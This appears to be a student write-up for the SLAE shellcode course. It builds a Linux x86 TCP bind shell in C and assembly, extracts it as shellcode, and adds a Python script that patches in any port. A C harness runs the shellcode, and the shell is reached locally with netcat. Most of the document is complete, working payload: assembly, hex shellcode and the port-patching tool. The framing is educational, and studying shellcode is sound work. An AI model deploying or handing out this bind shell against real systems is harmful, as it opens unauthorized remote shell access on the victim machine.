# SLAE course
The course can be found here:
[Link to course](https://www.pentesteracademy.com/course?id=3)

## Assignment#1: What to do ?

The first step of assignement#1 is to create a TCP bind shell in assembly.

This shellcode needs to be able to:
* Binds to a port
* Execs shell on incoming connection

The second step is to create a script which will make the port configuration easy


## First step: create a TCP bind shell
### What is a bind shell

A bind shell is a shell that binds to a specific port on the target host to listen for incoming connections.

### Example of bind shell TCP in C
```c
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>


int main()
{
    // Create sockaddr_in struct
    struct sockaddr_in addr;
    // AF_INET for IPv4
    addr.sin_family = AF_INET;
    // Set port number to 4444
    addr.sin_port = htons(4444);
    // Listen on any interface
    addr.sin_addr.s_addr = INADDR_ANY;

    // Create the sock
    // AF_INET for IPv4
    // SOCK_STREAM for TCP connection
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    // Bind address to sock
    bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));

    // Use the created sock to listen for connections
    listen(sockfd, 0);

    // Accept connections
    int connfd = accept(sockfd, NULL, NULL);

    for (int i = 0; i < 3; i++)
    {
        dup2(connfd, i);
    }

    // Execute /bin/sh
    execve("/bin/sh", NULL, NULL);
}
```

Before starting, a list of linux x86 systemcall can be found in the following files
```console
#cat /usr/include/asm/unistd_32.h
```
On older distributions the file is stored here:
```console
#cat /usr/include/i386-linux-gnu/asm/unistd_32.h 
```

Now, let's get to work.
=

The assembly code
-
The first step is to initialize the stack and the registers:
```nasm
;set the stack pointer

mov ebp, esp

;initialize registers to zero

xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx
```

The second step is to push the sockaddr_in struct in the stack:
```nasm
;Push sockaddr_in struct on the stack
;struct sockaddr_in addr;
;addr.sin_family = AF_INET;
;addr.sin_port = htons(4444);
;addr.sin_addr.s_addr = INADDR_ANY;

push eax
push eax            ;fill the end of the structure with 8 zeros
push eax            ;addr.sin_addr.s_addr = INADDR_ANY 
push word 0x5c11    ;addr.sin_port = htons(4444)
push word 0x02      ;addr.sin_family = AF_INET
```

We can now call the "socket" systemcall which will create an endpoint for communication:
```nasm
;int sockfd = socket(AF_INET, SOCK_STREAM, 0);

mov ax, 0x167   ;socket syscall number
mov bl, 0x02    ;AF_INET value
mov cl, 0x01    ;SOCK_STREAM value
int 0x80        ;Go for it
mov edi, eax    ;return value from the socket syscall
```

Then, we need to call the "bind" systemcall which will bind to the socket:
```nasm
;bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));

xor eax, eax
mov ax, 0x169   ;bind system call number
mov ebx, edi    ;sockfd 
mov ecx, esp    ;point to the start of the stack
mov edx, ebp
sub edx, esp    ;use the stack pointers (esp and ebp to calculate the sizeof the structure)
int 0x80        ;Go for it
```

Let's call the "listen" systemcall wich will listen for connections on the socket:
```nasm 
;listen(sockfd, 0);

xor eax, eax
mov ax, 0x16b   ;listen system call number
mov ebx, edi    ;sockfd value
xor ecx, ecx    ;NULL value
int 0x80        ;Go for it
```

The "accept" systemcall is used to accept a connection on the socket:
```nasm
;int connfd = accept(sockfd, NULL, NULL);

xor eax, eax
mov ax, 0x16c   ;accept system call number
mov ebx, edi    ;sockfd
xor ecx, ecx    ;NULL
xor edx, edx    ;NULL
xor esi, esi    ;initialize esi to NULL
int 0x80        ;Go for it
mov esi, eax    ;move accept return value in esi
```

This part of the code will use dup2 to redirect the STDIN, STDOUT and STDERR into the socket:
```nasm
;for (int i = 0; i < 3; i++)
;{
;    dup2(connfd, i);
;}

mov cl, 3
dup:
    xor eax, eax
    mov al, 0x3f    ;dup system call number 
    mov ebx, esi    ;mov the fd variable in ebx
    dec cl          ;dec to cl 1
    int 0x80        ;Go for it
    inc cl          ;inc to cl 1
    loop dup
```

It's finaly the time to execute the shell:
```nasm
;execve("/bin/sh", NULL, NULL);

xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f     ;push "/bin//sh" on the stack
mov al, 0xb         ;execve system call number
mov ebx, esp        ;initialize execve first parameters with a pointer to /bin//sh
xor ecx, ecx        ;NULL
xor edx, edx        ;NULL
int 0x80            ;Go for it
```

You can find the whole code below:
```nasm
;Simple ASM (x86) bind shell on port 4444

global _start
_start:
    ;set the stack pointer
    mov ebp, esp

    ;initialize registers
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx

    ;Push struct sockaddr_in on the stack
    ;struct sockaddr_in addr;
    ;addr.sin_family = AF_INET;
    ;addr.sin_port = htons(4444);
    ;addr.sin_addr.s_addr = INADDR_ANY;
    push eax
    push eax            ;fill the end of the structure with 8 zeros
    push eax            ;addr.sin_addr.s_addr = INADDR_ANY 
    push word 0x5c11    ;addr.sin_port = htons(4444)
    push word 0x02      ;addr.sin_family = AF_INET

    ;int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    mov ax, 0x167       ;socket syscall number
    mov bl, 0x02        ;AF_INET value
    mov cl, 0x01        ;SOCK_STREAM value
    int 0x80            ;Go for it
    mov edi, eax        ;return value from the socket syscall

    ;bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
    xor eax, eax
    mov ax, 0x169       ;bind system call number
    mov ebx, edi        ;sockfd 
    mov ecx, esp        ;point to the start of the stack
    mov edx, ebp
    sub edx, esp        ;use the stack pointers (esp and ebp to calculate the sizeof the structure)
    int 0x80            ;Go for it

    ;listen(sockfd, 0);
    xor eax, eax
    mov ax, 0x16b       ;listen system call number
    mov ebx, edi        ;sockfd value
    xor ecx, ecx        ;NULL value
    int 0x80            ;Go for it

    ;int connfd = accept(sockfd, NULL, NULL);
    xor eax, eax
    mov ax, 0x16c       ;accept system call number
    mov ebx, edi        ;sockfd
    xor ecx, ecx        ;NULL
    xor edx, edx        ;NULL
    xor esi, esi        ;xor esi register
    int 0x80            ;Go for it
    mov esi, eax        ;move the return variable into esi

    ;for (int i = 0; i < 3; i++)
    ;{
    ;    dup2(connfd, i);
    ;}
    mov cl, 3
    dup:
        xor eax, eax
        mov al, 0x3f    ;dup system call number 
        mov ebx, esi    ;mov the fd variable in ebx
        dec cl          ;dec to cl 1
        int 0x80        ;Go for it
        inc cl          ;inc to cl 1
        loop dup

    ;execve("/bin/sh", NULL, NULL);
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f     ;push "/bin//sh" on the stack
    mov al, 0xb         ;execve system call number
    mov ebx, esp        ;initialize execve first parameters with a pointer to /bin//sh
    xor ecx, ecx        ;NULL
    xor edx, edx        ;NULL
    int 0x80            ;Go for it
```

Let's compile and execute it: 
```console
#nasm -f elf32 -o bind_shell.o bind_shell.nasm
#ld -m elf_i386 -z execstack -o bind_shell bind_shell.o
#./bind_shell
```

We can check if the port 4444 is open using netstat:
```console
#netstat -antp | grep 4444
```

We can now connect to this new port using for example netcat and get our shell:
```console
#nc -nv 127.0.0.1 4444
```

# Second step: make the port configuration easy

Before explaining the python script used for this task, we need to retrieve the hexadecimal format of our shellcode. But instead of a simple '\x' before our hexadecimal value, we will need two of them '\\\x'. 

Why ? Because our python script won't interpret our shellcode without this part.

We can easily do that by using the following objdump command:
```console
#objdump -d ./bind_shell |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

"\\x89\\xe5\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x50\\x50\\x50\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x66\\xb8\\x69\\x01\\x89\\xfb\\x89\\xe1\\x89\\xea\\x29\\xe2\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6b\\x01\\x89\\xfb\\x31\\xc9\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6c\\x01\\x89\\xfb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\xcd\\x80\\x89\\xc6\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xf3\\xfe\\xc9\\xcd\\x80\\xfe\\xc1\\xe2\\xf2\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\xb0\\x0b\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xcd\\x80"
```

We can now add this shellcode to our python script. This script is pretty simple, it parses the 'shellcode' variable content, look for the '\\x11\\x5c' (which is 4444 in reverse hexadecimal) pattern and replace it by the port value asked by the user.

Here is the code:
```python
#!/usr/bin/python3

import sys
import socket

# shellcode used (default port: 4444)
shellcode = "\\x89\\xe5\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x50\\x50\\x50\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x66\\xb8\\x69\\x01\\x89\\xfb\\x89\\xe1\\x89\\xea\\x29\\xe2\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6b\\x01\\x89\\xfb\\x31\\xc9\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6c\\x01\\x89\\xfb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\xcd\\x80\\x89\\xc6\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xf3\\xfe\\xc9\\xcd\\x80\\xfe\\xc1\\xe2\\xf2\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\xb0\\x0b\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xcd\\x80"

# Check if a port is specified
if len(sys.argv) < 2:
    print ('Usage: python {name} [port_to_bind]'.format(name = sys.argv[0]))
    print ('Example: python {name} 2222'.format(name = sys.argv[0]))
    exit(1)

# convert the port format from str to hex format
port = hex(socket.htons(int(sys.argv[1])))

# Replace port number
shellcode = shellcode.replace('\\x11\\x5c', '\\x{0}\\x{1}'.format(port[4:6],port[2:4]))

print(shellcode)
```

This script will give us the following result:
```console
#./modify_bind_shell.py 2222

"\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x50\x50\x66\x68\x08\xae\x66\x6a\x02\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x69\x01\x89\xfb\x89\xe1\x89\xea\x29\xe2\xcd\x80\x31\xc0\x66\xb8\x6b\x01\x89\xfb\x31\xc9\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x89\xc6\xb1\x03\x31\xc0\xb0\x3f\x89\xf3\xfe\xc9\xcd\x80\xfe\xc1\xe2\xf2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80"
```

In order to test it, we can now used this return and add it to a C program which will execute our shellcode

The C program source code (this code can be found at root directory named 'test_shellcode.c')
```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x50\x50\x66\x68\x08\xae\x66\x6a\x02\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x69\x01\x89\xfb\x89\xe1\x89\xea\x29\xe2\xcd\x80\x31\xc0\x66\xb8\x6b\x01\x89\xfb\x31\xc9\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x89\xc6\xb1\x03\x31\xc0\xb0\x3f\x89\xf3\xfe\xc9\xcd\x80\xfe\xc1\xe2\xf2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
```

Let's compile and execute this program:
```console
#gcc test_shellcode.c -o test_shellcode -m32 -fno-stack-protector -z execstack 
#./test_shellcode 
Shellcode Length:  117
```
We can use netcat to check if the port 2222 is open:
```console
#netstat -antp | grep 2222
```

Finaly, netcat can be used to access our bind shell 
```console
#nc -nv 127.0.0.1 2222
```

